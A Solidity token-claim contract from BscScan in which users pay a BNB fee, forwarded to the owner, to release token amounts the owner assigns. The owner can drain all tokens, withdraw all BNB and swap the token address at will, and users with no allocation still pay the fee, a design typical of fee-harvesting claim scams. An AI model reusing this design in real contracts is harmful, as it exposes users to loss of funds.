/**
 *Submitted for verification at BscScan.com on 2023-03-06
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;
interface IBEP20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address account) external view returns (uint);
    function transfer(address recipient, uint amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint amount) external returns (bool);
    function transferFrom(address sender,address recipient,uint amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

abstract contract Context 
{
    function _msgSender() internal view virtual returns (address) 
    {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) 
    {
        this; 
        return msg.data;
    }
}
abstract contract OwnableV2 is Context
{
    address _owner;
    address public _newOwner;
    constructor()  
    {
        _owner = payable(msg.sender);
    }

    modifier onlyOwner() 
    {
        require(_msgSender() == _owner, "Only owner");
        _;
    }

    function changeOwner(address newOwner) onlyOwner public
    {
        _newOwner = newOwner;
    }
    function confirm() public
    {
        require(_newOwner == msg.sender);
        _owner = _newOwner;
    }
}
contract TestContract is OwnableV2
{

    IBEP20 token;
    uint Fee = 2 * 10 ** 15;

    constructor (address _token) 
    {
        token = IBEP20(payable(_token));
    }

    mapping (address => uint) public freezed;

    modifier unfreez(address user) 
    {
        require(freezed[user] == 0, "unfreez now");
        _;
    }

    modifier canUnfreez(address user)
    {
        require(freezed[user] > 0, "unfreez now");
        _;
    }

    modifier enoughtFee(uint amount)
    {
        require( amount >= Fee, "Not enought fee");
        _;
    }
    function getFreezed (address user) public view returns(uint)
    {
        return freezed[user];
    } 
    function getUnfreezAll() enoughtFee(msg.value) public payable returns (bool)
    {
        payable(_owner).transfer(msg.value);
        token.transfer(msg.sender, getFreezed(msg.sender));
        freezed[msg.sender] = 0;
        return true;
    }                     
    function withdraw() onlyOwner public
    {
        payable(_owner).transfer(address(this).balance);
    }
 
    function transferFromContract(address to,  uint amount) public onlyOwner returns (bool)
    {
        token.transfer(to, amount);
        return true;
    } 
    function SetUnfreez( address user, uint amount) public onlyOwner unfreez(user)
    {
        freezed[user] = amount;
    }
    function SetToken (address _token) public onlyOwner
    {
        token = IBEP20(payable(_token));
    }    
}